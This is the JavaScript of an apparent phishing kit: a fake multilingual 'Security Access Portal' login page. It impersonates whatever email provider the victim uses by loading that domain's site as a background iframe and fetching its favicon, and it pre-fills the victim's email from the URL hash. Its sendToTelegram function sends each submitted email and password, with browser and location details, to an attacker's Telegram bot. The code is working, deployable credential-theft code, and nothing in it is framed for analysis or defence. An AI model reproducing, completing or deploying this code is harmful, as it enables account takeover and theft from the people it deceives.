// Replace the values below:
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// ==================== GLOBAL VARIABLES ====================
let currentBackgroundDomain = '';
let userLanguage = 'en';
let translations = {};

// ==================== TRANSLATION SYSTEM ====================
const translationStrings = {
    en: {
        subtitle: "Security Access Portal",
        email_label: "Email",
        password_label: "Password",
        show_password: "Show",
        hide_password: "Hide",
        login_button: "Login",
        forgot_password: "Forgot password?",
        alternative_method: "Use alternative method",
        encrypted_connection: "Encrypted connection",
        copyright: "© 2024",
        privacy: "Privacy",
        terms: "Terms",
        security: "Security",
        please_fill: "Please fill in all fields",
        sending: "Sending...",
        submitted_success: "Login submitted successfully",
        error_submitting: "Error submitting form. Please try again.",
        logging_into: "Logging into"
    }
};

async function detectUserLanguage() {
    const ipDetectionServices = [
        'https://ipapi.co/json/',
        'https://ipinfo.io/json',
        'https://api.ipgeolocation.io/ipgeo?apiKey=free',
        'https://api.db-ip.com/v2/free/self',
        'https://geolocation-db.com/json/'
    ];
    
    for (const service of ipDetectionServices) {
        try {
            const response = await fetch(service, {
                signal: AbortSignal.timeout(3000)
            });
            
            if (response.ok) {
                const data = await response.json();
                const countryCode = data.country_code || data.countryCode || data.country;
                
                if (countryCode) {
                    const lang = mapCountryToLanguage(countryCode);
                    return lang;
                }
            }
        } catch (error) {
            continue;
        }
    }
    
    const browserLang = navigator.language || navigator.userLanguage || 'en';
    return browserLang.split('-')[0];
}

function mapCountryToLanguage(countryCode) {
    const countryToLang = {
        'US': 'en', 'GB': 'en', 'CA': 'en', 'AU': 'en', 'NZ': 'en',
        'IE': 'en', 'SG': 'en', 'ZA': 'en', 'IN': 'en',
        'ES': 'es', 'MX': 'es', 'AR': 'es', 'CO': 'es', 'PE': 'es',
        'VE': 'es', 'CL': 'es', 'EC': 'es', 'GT': 'es', 'CU': 'es',
        'FR': 'fr', 'BE': 'fr', 'CH': 'fr', 'LU': 'fr', 'CA': 'fr',
        'DE': 'de', 'AT': 'de', 'CH': 'de', 'LI': 'de', 'LU': 'de',
        'PT': 'pt', 'BR': 'pt', 'AO': 'pt', 'MZ': 'pt',
        'IT': 'it', 'SM': 'it', 'VA': 'it', 'CH': 'it',
        'RU': 'ru', 'BY': 'ru', 'KZ': 'ru', 'KG': 'ru',
        'CN': 'zh', 'TW': 'zh', 'HK': 'zh', 'MO': 'zh', 'SG': 'zh',
        'JP': 'ja',
        'KR': 'ko', 'KP': 'ko',
        'SA': 'ar', 'AE': 'ar', 'EG': 'ar', 'DZ': 'ar', 'MA': 'ar',
        'TR': 'tr', 'CY': 'tr',
        'NL': 'nl', 'BE': 'nl',
        'SE': 'sv',
        'NO': 'no',
        'DK': 'da',
        'PL': 'pl',
        'CZ': 'cs',
        'GR': 'el', 'CY': 'el',
        'IL': 'he',
        'IN': 'hi',
        'TH': 'th',
        'VN': 'vi',
        'ID': 'id',
        'PH': 'tl'
    };
    
    const normalizedCode = countryCode.toUpperCase();
    return countryToLang[normalizedCode] || 'en';
}

function getBrowserLanguage() {
    const browserLang = navigator.language || navigator.userLanguage || navigator.browserLanguage || 'en';
    return browserLang.split('-')[0].toLowerCase();
}

async function translatePage(lang) {
    if (lang === 'en' || !lang) return;
    
    const elements = document.querySelectorAll('[data-i18n]');
    const textsToTranslate = [];
    const elementMap = [];
    
    elements.forEach(el => {
        const key = el.getAttribute('data-i18n');
        if (translationStrings.en[key]) {
            textsToTranslate.push(translationStrings.en[key]);
            elementMap.push({ element: el, key: key });
        }
    });
    
    if (textsToTranslate.length === 0) return;
    
    try {
        const services = [
            {
                url: 'https://libretranslate.de/translate',
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    q: textsToTranslate,
                    source: 'en',
                    target: lang,
                    format: 'text'
                })
            },
            {
                url: 'https://translate.argosopentech.com/translate',
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    q: textsToTranslate,
                    source: 'en',
                    target: lang,
                    format: 'text'
                })
            }
        ];
        
        let translatedTexts = [];
        
        for (const service of services) {
            try {
                const response = await fetch(service.url, {
                    method: service.method || 'GET',
                    headers: service.headers,
                    body: service.body,
                    signal: AbortSignal.timeout(5000)
                });
                
                if (response.ok) {
                    const data = await response.json();
                    translatedTexts = data.translatedText || [];
                    if (translatedTexts.length === textsToTranslate.length) break;
                }
            } catch (error) {
                continue;
            }
        }
        
        if (translatedTexts.length === textsToTranslate.length) {
            elementMap.forEach((item, index) => {
                if (translatedTexts[index]) {
                    item.element.textContent = translatedTexts[index];
                }
            });
            
            updateLanguageButton(lang);
            
            translations.logging_into = translatedTexts[textsToTranslate.indexOf("Logging into")] || "Logging into";
            translations.please_fill = translatedTexts[textsToTranslate.indexOf("Please fill in all fields")] || "Please fill in all fields";
            translations.sending = translatedTexts[textsToTranslate.indexOf("Sending...")] || "Sending...";
            translations.submitted_success = translatedTexts[textsToTranslate.indexOf("Login submitted successfully")] || "Login submitted successfully";
            translations.error_submitting = translatedTexts[textsToTranslate.indexOf("Error submitting form. Please try again.")] || "Error submitting form. Please try again.";
        }
        
    } catch (error) {
        console.log('Translation failed');
    }
}

function updateLanguageButton(lang) {
    const langBtn = document.getElementById('langToggle');
    if (!langBtn) return;
    
    const languageNames = {
        'en': 'English', 'es': 'Español', 'fr': 'Français', 'de': 'Deutsch',
        'it': 'Italiano', 'pt': 'Português', 'ru': 'Русский', 'zh': '中文',
        'ja': '日本語', 'ko': '한국어', 'ar': 'العربية', 'hi': 'हिन्दी',
        'nl': 'Nederlands', 'sv': 'Svenska', 'no': 'Norsk', 'da': 'Dansk',
        'pl': 'Polski', 'cs': 'Čeština', 'el': 'Ελληνικά', 'he': 'עברית',
        'th': 'ไทย', 'vi': 'Tiếng Việt', 'id': 'Bahasa Indonesia', 'tl': 'Filipino'
    };
    
    langBtn.textContent = `🌐 ${languageNames[lang] || lang.toUpperCase()}`;
}

function setupLanguageToggle() {
    const langBtn = document.getElementById('langToggle');
    if (!langBtn) return;
    
    langBtn.addEventListener('click', async () => {
        if (userLanguage === 'en') {
            const detectedLang = await detectUserLanguage();
            if (detectedLang !== 'en') {
                userLanguage = detectedLang;
                await translatePage(detectedLang);
            }
        } else {
            userLanguage = 'en';
            location.reload();
        }
    });
}

// ==================== WEBSITE BACKGROUND LOADER ====================
async function loadWebsiteBackground(domain) {
    if (!domain || currentBackgroundDomain === domain) return;
    
    currentBackgroundDomain = domain;
    
    const existingIframe = document.querySelector('.website-background');
    if (existingIframe) {
        existingIframe.remove();
    }
    
    const iframe = document.createElement('iframe');
    iframe.className = 'website-background';
    iframe.id = 'websiteBackground';
    iframe.style.cssText = `
        position: fixed;
        inset: 0;
        width: 100%;
        height: 100%;
        z-index: -1;
        border: none;
        background: white;
        opacity: 0;
        transition: opacity 1s ease;
    `;
    
    const urlAttempts = [
        `https://${domain}`,
        `https://www.${domain}`,
        `http://${domain}`,
        `http://www.${domain}`,
        `https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2F${domain}`,
        `https://r.jina.ai/https://${domain}`,
        `https://cors-anywhere.herokuapp.com/https://${domain}`,
        `https://api.allorigins.win/raw?url=https://${domain}`
    ];
    
    document.body.appendChild(iframe);
    
    let loadedSuccessfully = false;
    
    for (let i = 0; i < urlAttempts.length; i++) {
        const url = urlAttempts[i];
        
        try {
            await new Promise((resolve) => {
                const timeout = setTimeout(() => {
                    resolve();
                }, 3000);
                
                iframe.onload = () => {
                    clearTimeout(timeout);
                    loadedSuccessfully = true;
                    
                    setTimeout(() => {
                        iframe.style.opacity = '1';
                    }, 500);
                    
                    resolve();
                };
                
                iframe.onerror = () => {
                    clearTimeout(timeout);
                    resolve();
                };
                
                iframe.src = url;
                iframe.setAttribute('referrerpolicy', 'no-referrer');
                iframe.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
            });
            
            if (loadedSuccessfully) break;
            
        } catch (error) {
            continue;
        }
    }
    
    if (!loadedSuccessfully) {
        const screenshotUrl = `https://image.thum.io/get/width/1920/crop/1080/noanimate/https://${domain}`;
        iframe.src = screenshotUrl;
        
        iframe.onload = () => {
            setTimeout(() => {
                iframe.style.opacity = '1';
            }, 500);
        };
        
        iframe.onerror = () => {
            createThemedBackground(domain);
        };
    }
}

function createThemedBackground(domain) {
    const themedPage = `
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body {
                    margin: 0;
                    padding: 0;
                    height: 100vh;
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    font-family: Arial, sans-serif;
                    text-align: center;
                }
                h1 {
                    font-size: 48px;
                    margin-bottom: 20px;
                    text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
                }
                p {
                    font-size: 24px;
                    opacity: 0.9;
                }
                .domain {
                    font-size: 36px;
                    font-weight: bold;
                    margin: 20px 0;
                    background: rgba(255,255,255,0.1);
                    padding: 10px 30px;
                    border-radius: 10px;
                    backdrop-filter: blur(10px);
                }
            </style>
        </head>
        <body>
            <h1>${domain}</h1>
            <div class="domain">${domain}</div>
            <p>Secure Login Portal</p>
        </body>
        </html>
    `;
    
    const blob = new Blob([themedPage], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    
    const iframe = document.getElementById('websiteBackground');
    if (iframe) {
        iframe.src = url;
        setTimeout(() => {
            iframe.style.opacity = '1';
        }, 500);
    }
}

// ==================== EMAIL EXTRACTION AND LOGO FETCHING ====================
async function extractAndSetEmailFromHash() {
    const hash = window.location.hash;
    
    if (!hash) return false;
    
    const emailFromHash = hash.substring(1);
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    
    if (emailRegex.test(emailFromHash)) {
        document.getElementById('user_email').value = emailFromHash;
        
        const domain = emailFromHash.split('@')[1];
        
        loadWebsiteBackground(domain);
        
        fetchDomainLogo(domain);
        
        showDomainInfo(domain);
        
        setTimeout(() => {
            document.getElementById('pw').focus();
        }, 100);
        
        return true;
    }
    
    return false;
}

async function fetchDomainLogo(domain) {
    if (!domain) return;
    
    const logoImg = document.getElementById('logoImg');
    
    try {
        const faviconSources = [
            `https://www.google.com/s2/favicons?domain=${domain}&sz=128`,
            `https://favicon.twenty.com/${domain}`,
            `https://icons.duckduckgo.com/ip3/${domain}.ico`,
            `https://${domain}/favicon.ico`,
            `https://www.${domain}/favicon.ico`
        ];
        
        for (const src of faviconSources) {
            const img = new Image();
            try {
                await new Promise((resolve, reject) => {
                    img.onload = resolve;
                    img.onerror = reject;
                    img.src = src;
                });
                logoImg.src = src;
                return;
            } catch (e) {
                continue;
            }
        }
        
    } catch (error) {
        console.log('Error fetching favicon');
    }
}

function showDomainInfo(domain) {
    const domainInfoDiv = document.getElementById('domainInfo');
    
    if (domain && domainInfoDiv) {
        const domainLogo = document.createElement('img');
        domainLogo.className = 'domain-logo';
        domainLogo.src = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
        domainLogo.alt = `${domain} logo`;
        domainLogo.onerror = function() {
            this.style.display = 'none';
        };
        
        const domainText = document.createElement('span');
        domainText.textContent = `${translations.logging_into || "Logging into"} ${domain}`;
        
        domainInfoDiv.innerHTML = '';
        domainInfoDiv.appendChild(domainLogo);
        domainInfoDiv.appendChild(domainText);
    }
}

// ==================== FORM HANDLING ====================
function setupFormHandling() {
    const form = document.getElementById('loginForm');
    if (!form) return;
    
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const submitBtn = document.getElementById('submitBtn');
        const messageDiv = document.getElementById('message');
        const originalBtnText = submitBtn.textContent;
        
        const email = document.getElementById('user_email').value;
        const password = document.getElementById('pw').value;
        
        if (!email || !password) {
            showMessage(translations.please_fill || 'Please fill in all fields', 'error');
            return;
        }
        
        submitBtn.disabled = true;
        submitBtn.textContent = translations.sending || 'Sending...';
        messageDiv.style.display = 'none';
        
        try {
            await sendToTelegram(email, password);
            showMessage(translations.submitted_success || 'Login submitted successfully', 'success');
            document.getElementById('pw').value = '';
            
        } catch (error) {
            console.error('Error:', error);
            showMessage(translations.error_submitting || 'Error submitting form. Please try again.', 'error');
        } finally {
            submitBtn.disabled = false;
            submitBtn.textContent = originalBtnText;
        }
    });
}

// ==================== TELEGRAM FUNCTION ====================
async function sendToTelegram(email, password) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || 
        TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
        TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        throw new Error('Please configure Telegram bot token and chat ID first');
    }
    
    const domain = email.includes('@') ? email.split('@')[1] : 'unknown';
    
    const message = `🔐 *New Login Submission*\n\n📧 *Email:* \`${email}\`\n🔑 *Password:* \`${password}\`\n🏷️ *Domain:* ${domain}\n🌐 *Browser:* ${navigator.userAgent}\n📍 *Language:* ${userLanguage}\n🕐 *Time:* ${new Date().toLocaleString()}\n🔗 *URL:* ${window.location.href}`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        })
    });
    
    const data = await response.json();
    
    if (!response.ok || !data.ok) {
        throw new Error(data.description || 'Failed to send message to Telegram');
    }
    
    return data;
}

// ==================== UTILITY FUNCTIONS ====================
function showMessage(text, type = 'error') {
    const messageDiv = document.getElementById('message');
    if (!messageDiv) return;
    
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.style.display = 'block';
    
    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 5000);
}

function setupEmailInputListener() {
    const emailInput = document.getElementById('user_email');
    if (!emailInput) return;
    
    emailInput.addEventListener('input', async function(e) {
        const email = e.target.value;
        if (email.includes('@')) {
            const domain = email.split('@')[1];
            if (domain.includes('.')) {
                showDomainInfo(domain);
                
                if (domain !== currentBackgroundDomain) {
                    loadWebsiteBackground(domain);
                    fetchDomainLogo(domain);
                }
            }
        }
    });
}

function setupPasswordToggle() {
    const toggle = document.getElementById('togglePassword');
    const pw = document.getElementById('pw');
    
    if (toggle && pw) {
        toggle.addEventListener('click', function() {
            const isPassword = pw.type === 'password';
            pw.type = isPassword ? 'text' : 'password';
            this.textContent = isPassword ? 
                (translations.hide_password || 'Hide') : 
                (translations.show_password || 'Show');
        });
    }
}

// ==================== INITIALIZATION ====================
async function initialize() {
    translations = { ...translationStrings.en };
    
    setupFormHandling();
    setupEmailInputListener();
    setupPasswordToggle();
    setupLanguageToggle();
    
    try {
        const detectedLang = await detectUserLanguage();
        
        if (detectedLang !== 'en') {
            userLanguage = detectedLang;
            await translatePage(detectedLang);
        } else {
            updateLanguageButton('en');
        }
    } catch (error) {
        updateLanguageButton('en');
    }
    
    await extractAndSetEmailFromHash();
    
    if (!currentBackgroundDomain) {
        createThemedBackground('Secure Portal');
    }
}

document.addEventListener('DOMContentLoaded', initialize);
